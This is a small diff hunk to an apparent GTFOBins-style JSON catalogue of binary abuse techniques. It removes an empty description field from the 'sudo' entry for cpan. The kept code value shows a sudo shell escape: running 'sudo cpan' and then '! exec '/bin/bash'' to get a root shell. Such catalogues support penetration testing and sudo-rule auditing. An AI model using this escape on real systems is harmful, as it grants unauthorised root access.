@@ -26,7 +26,7 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo cpan\n! exec '/bin/bash'\n"
       }
     ]
